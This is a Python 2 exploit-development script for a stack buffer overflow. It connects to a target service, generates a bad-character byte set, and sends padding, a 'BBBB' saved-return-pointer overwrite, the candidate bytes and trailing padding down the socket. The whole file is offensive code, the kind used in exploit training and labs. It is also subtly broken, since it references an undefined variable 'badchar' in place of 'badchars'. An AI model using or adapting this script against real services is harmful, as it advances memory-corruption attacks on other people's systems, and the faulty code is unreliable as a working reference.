#!/usr/bin/env python2
import socket

# set up the IP and port we're connecting to
RHOST = "0.0.0.0"
RPORT = 12345

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# construct badchars
badchars = ""
knownbad = [0x00, 0x0A]

for i in range(0x00, 0xFF+1):
  if i not in knownbad:
    badchars += chr(i)

with open("badchars.bin", "wb") as f:
  f.write(badchars)

# build payload followed by a newline
trigger = 1024
offset = 146

buf = ""
buf += "A" * (offset - len(buf))    # padding
buf += "BBBB"                       # SRP/EIP overwrite
buf += badchar                      # ESP overwrite
buf += "D" * (trigger - len(buf))   # trailing padding
buf += "\n"

# send payload down the socket
s.send(buf)

# print out what we sent
print "Sent: {0}".format(buf)

# receive some data from the socket
resp = s.recv(1024)

# print out what we received
print "Received: {0}".format(resp)
